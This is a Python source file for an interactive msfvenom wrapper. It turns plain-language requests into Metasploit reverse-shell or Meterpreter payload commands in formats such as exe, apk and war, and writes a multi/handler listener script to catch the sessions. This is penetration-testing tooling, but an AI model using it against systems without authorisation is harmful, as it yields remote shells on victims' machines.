"""kernox.tools.msfvenom – The Full Advanced Smart Payload Generator."""

from __future__ import annotations
import subprocess
import re
import socket
import os
import json
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()


class MsfvenomTool:
    name = "msfvenom"
    CACHE_FILE = os.path.expanduser("~/.kernox/msfvenom_cache.json")

    def __init__(self):
        self._payload_cache = None
        self._payload_descriptions = {}
        self._cache_loaded = False
        self._last_output = None
        self._last_command = None

    # --- VALIDATION ---
    def _validate_ip(self, ip: str) -> bool:
        try:
            socket.inet_aton(ip)
            return True
        except:
            return False

    def _validate_port(self, port: str) -> bool:
        try:
            return 1 <= int(port) <= 65535
        except:
            return False

    # --- CACHE ---
    def _ensure_payload_cache(self):
        if self._cache_loaded:
            return
        
        if os.path.exists(self.CACHE_FILE):
            try:
                with open(self.CACHE_FILE, 'r') as f:
                    cache = json.load(f)
                    self._payload_cache = cache.get('payloads', [])
                    self._payload_descriptions = cache.get('descriptions', {})
                    self._cache_loaded = True
                    return
            except:
                pass

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
            progress.add_task(description="Indexing MSFvenom payloads...", total=None)
            try:
                result = subprocess.run(["msfvenom", "-l", "payloads"], capture_output=True, text=True, timeout=20)
                payloads, descriptions = [], {}
                for line in result.stdout.split("\n"):
                    if line.strip() and not any(line.startswith(x) for x in ["=", "Name", "-", " "]):
                        parts = line.strip().split(maxsplit=1)
                        if parts:
                            p_name = parts[0]
                            payloads.append(p_name)
                            descriptions[p_name] = parts[1] if len(parts) > 1 else ""
                
                self._payload_cache, self._payload_descriptions = payloads, descriptions
                os.makedirs(os.path.dirname(self.CACHE_FILE), exist_ok=True)
                with open(self.CACHE_FILE, 'w') as f:
                    json.dump({'payloads': payloads, 'descriptions': descriptions}, f)
                self._cache_loaded = True
            except:
                self._payload_cache = ["windows/x64/meterpreter/reverse_tcp", "linux/x86/shell_reverse_tcp"]

    # --- INTENT PARSING ---
    def _parse_intent(self, user_input: str) -> dict:
        input_lower = user_input.lower()
        
        intent = {
            "platform": None,
            "type": "reverse",
            "style": "shell",
            "protocol": "tcp",
            "original": user_input
        }
        
        platforms = {
            "windows": ["windows", "win", "exe"],
            "linux": ["linux", "nix", "elf"],
            "php": ["php"],
            "python": ["python", "py"],
            "android": ["android", "apk"],
            "java": ["java", "jsp", "war"]
        }
        
        for plat, triggers in platforms.items():
            if any(t in input_lower for t in triggers):
                intent["platform"] = plat
                break
        
        if "bind" in input_lower:
            intent["type"] = "bind"
        
        if "meterpreter" in input_lower:
            intent["style"] = "meterpreter"
        
        if "https" in input_lower:
            intent["protocol"] = "https"
        elif "http" in input_lower:
            intent["protocol"] = "http"
        
        return intent

    # --- PAYLOAD SCORING ---
    def _score_payload(self, payload: str, intent: dict) -> int:
        payload_lower = payload.lower()
        score = 0
        
        if intent["platform"] and intent["platform"] in payload_lower:
            score += 40
        if intent["type"] in payload_lower:
            score += 30
        if intent["protocol"] in payload_lower:
            score += 20
        if intent["style"] in payload_lower:
            score += 25
        
        for word in intent["original"].lower().split():
            if len(word) > 3 and word in payload_lower:
                score += 5
        
        return score

    # --- PAYLOAD SEARCH ---
    def _find_payloads(self, intent: dict) -> list:
        self._ensure_payload_cache()
        
        if intent["platform"]:
            candidates = [p for p in self._payload_cache if intent["platform"] in p.lower()]
        else:
            candidates = self._payload_cache
        
        scored = []
        for p in candidates:
            score = self._score_payload(p, intent)
            if score > 0:
                scored.append({"payload": p, "score": score, "desc": self._payload_descriptions.get(p, "")[:80]})
        
        scored.sort(key=lambda x: x["score"], reverse=True)
        return scored[:15]

    # --- PAYLOAD SELECTION WITH PAGINATION ---
    def _select_payload(self, intent: dict) -> str:
        matches = self._find_payloads(intent)
        final_list = [m["payload"] for m in matches]
        
        if not final_list:
            console.print("[yellow]No matches found. Enter payload manually.[/yellow]")
            return Prompt.ask("[cyan]Payload[/cyan]")
        
        offset, limit = 0, 10
        
        while True:
            page = final_list[offset:offset+limit]
            console.print(f"\n[bold green]🔍 Matching Payloads (Page {offset//10 + 1}):[/bold green]")
            for i, p in enumerate(page, 1):
                desc = self._payload_descriptions.get(p, "")[:60]
                console.print(f"  {i}. [yellow]{p}[/yellow]")
                if desc:
                    console.print(f"     [dim]{desc}...[/dim]")
            
            console.print(f"\n[cyan]Options:[/cyan] [green]#[/green] select | [cyan]n/next[/cyan] next | [cyan]p/prev[/cyan] prev | [cyan]s/search[/cyan] search | [cyan]q/quit[/cyan] quit")
            choice = Prompt.ask("Select", default="1").strip().lower()
            
            # Pagination
            if choice in ['n', 'next']:
                if offset + limit < len(final_list):
                    offset += limit
                else:
                    console.print("[yellow]No more pages[/yellow]")
                continue
            elif choice in ['p', 'prev']:
                if offset - limit >= 0:
                    offset -= limit
                else:
                    console.print("[yellow]Already at first page[/yellow]")
                continue
            elif choice in ['s', 'search']:
                new_search = Prompt.ask("[cyan]Enter search keywords[/cyan]")
                new_intent = self._parse_intent(new_search)
                new_matches = self._find_payloads(new_intent)
                if new_matches:
                    final_list = [m["payload"] for m in new_matches]
                    offset = 0
                else:
                    console.print("[yellow]No matches found[/yellow]")
                continue
            elif choice in ['q', 'quit']:
                return None
            elif choice.isdigit() and 1 <= int(choice) <= len(page):
                return page[int(choice)-1]
            elif len(choice) > 1:
                return choice
            else:
                console.print("[red]Invalid selection[/red]")

    # --- IP MENU ---
    def _get_ips(self) -> list:
        ips = []
        try:
            result = subprocess.run(["ip", "-4", "addr", "show"], capture_output=True, text=True)
            for line in result.stdout.split("\n"):
                if "inet " in line and "127.0.0.1" not in line:
                    parts = line.strip().split()
                    for i, part in enumerate(parts):
                        if part == "inet" and i + 1 < len(parts):
                            ip = parts[i+1].split('/')[0]
                            ips.append(ip)
        except:
            pass
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            if ip not in ips:
                ips.append(ip)
        except:
            pass
        
        return ips if ips else ["192.168.1.100"]

    def _select_ip(self) -> str:
        ips = self._get_ips()
        
        console.print("\n[bold cyan]📡 Select LHOST:[/bold cyan]")
        for i, ip in enumerate(ips, 1):
            console.print(f"  {i}. [yellow]{ip}[/yellow]")
        console.print(f"  {len(ips)+1}. [cyan]Enter custom IP[/cyan]")
        
        choice = Prompt.ask("Select", default="1")
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(ips):
                return ips[idx-1]
            elif idx == len(ips) + 1:
                ip = Prompt.ask("[cyan]Enter custom IP[/cyan]")
                if self._validate_ip(ip):
                    return ip
                console.print("[red]Invalid IP, using default[/red]")
                return ips[0]
        return ips[0]

    # --- FORMAT SELECTION ---
    def _select_format(self, payload: str) -> str:
        formats = {
            "windows": ["exe", "ps1", "vbs", "msi", "raw"],
            "linux": ["elf", "sh", "raw"],
            "php": ["php", "raw"],
            "python": ["py", "raw"],
            "android": ["apk", "raw"],
            "java": ["jar", "jsp", "war", "raw"]
        }
        
        platform = "unknown"
        for plat in formats.keys():
            if plat in payload.lower():
                platform = plat
                break
        
        fmt_list = formats.get(platform, ["exe", "elf", "raw"])
        
        console.print("\n[bold cyan]📦 Select Format:[/bold cyan]")
        for i, f in enumerate(fmt_list, 1):
            console.print(f"  {i}. [yellow]{f}[/yellow]")
        
        choice = Prompt.ask("Select", default="1")
        if choice.isdigit() and 1 <= int(choice) <= len(fmt_list):
            return fmt_list[int(choice)-1]
        return fmt_list[0]

    # --- OUTPUT PATH ---
    def _get_output_path(self, payload: str, lport: str, fmt: str) -> str:
        clean = payload.replace("/", "_")
        ext_map = {"exe": ".exe", "elf": ".elf", "php": ".php", "py": ".py", "apk": ".apk", 
                   "ps1": ".ps1", "vbs": ".vbs", "msi": ".msi", "sh": ".sh", "jar": ".jar", 
                   "jsp": ".jsp", "war": ".war", "raw": ".bin"}
        ext = ext_map.get(fmt, ".bin")
        return f"/tmp/msfvenom_{clean}_{lport}{ext}"

    # --- MAIN ---
    def build_command(self, **kwargs) -> str:
        user_input = kwargs.get("payload", "")
        if not user_input:
            return ""
        
        # Parse AI intent
        intent = self._parse_intent(user_input)
        console.print(f"\n[cyan]🎯 Understanding: {user_input}[/cyan]")
        
        # Find and select payload
        payload = self._select_payload(intent)
        if not payload:
            return ""
        
        is_reverse = "reverse" in payload.lower()
        
        # LHOST (only for reverse)
        lhost = None
        if is_reverse:
            lhost = self._select_ip()
        
        # LPORT
        console.print("\n[bold cyan]🔌 LPORT:[/bold cyan]")
        lport = Prompt.ask("Enter port", default="443")
        while not self._validate_port(lport):
            lport = Prompt.ask("[red]Invalid[/red] Enter port", default="443")
        
        # Format
        fmt = self._select_format(payload)
        
        # Output path
        output = self._get_output_path(payload, lport, fmt)
        
        # Build command
        cmd = ["msfvenom", "-p", payload]
        if is_reverse and lhost:
            cmd.append(f"LHOST={lhost}")
        cmd.append(f"LPORT={lport}")
        cmd.extend(["-f", fmt, "-o", output])
        
        # Store for parse method
        self._last_output = output
        self._last_command = " ".join(cmd)
        
        # Summary
        summary = Table(title="Payload Configuration", box=None)
        summary.add_column("Option", style="cyan")
        summary.add_column("Value", style="yellow")
        summary.add_row("Payload", payload)
        if is_reverse and lhost:
            summary.add_row("LHOST", lhost)
        summary.add_row("LPORT", lport)
        summary.add_row("Format", fmt)
        summary.add_row("Output", output)
        console.print(Panel(summary, border_style="green"))
        
        # Confirmation
        if not Confirm.ask("\n[bold yellow]Generate?[/bold yellow]", default=True):
            return ""
        
        # Handler RC
        rc_path = output + ".rc"
        with open(rc_path, 'w') as f:
            f.write(f"use exploit/multi/handler\nset PAYLOAD {payload}\n")
            if is_reverse and lhost:
                f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\nset ExitOnSession false\nexploit -j -z\n")
        
        console.print(f"\n[green]✓ Handler: {rc_path}[/green]")
        console.print(f"[dim]msfconsole -q -r {rc_path}[/dim]")
        
        return " ".join(cmd)

    def parse(self, output: str) -> dict:
        """Parse msfvenom output."""
        success = False
        output_file = None
        size = 0
        
        # Check for "Saved as:" in output
        if "Saved as:" in output:
            success = True
            match = re.search(r"Saved as:\s*(.+)", output)
            if match:
                output_file = match.group(1).strip()
        
        # Fallback for "written to"
        elif "written to" in output:
            success = True
            match = re.search(r"written to\s*(.+)", output)
            if match:
                output_file = match.group(1).strip()
        
        # Use stored output path if not found
        if not output_file and hasattr(self, '_last_output'):
            output_file = self._last_output
            if output_file and os.path.exists(output_file):
                success = True
        
        # Get file size if exists
        if output_file and os.path.exists(output_file):
            size = os.path.getsize(output_file)
            console.print(f"\n[green]✓ Payload generated: {size:,} bytes[/green]")
            console.print(f"[green]📁 {output_file}[/green]")
        elif success:
            console.print(f"\n[green]✓ Payload generated successfully![/green]")
        
        return {
            "success": success,
            "output_file": output_file,
            "size": size,
            "raw": output
        }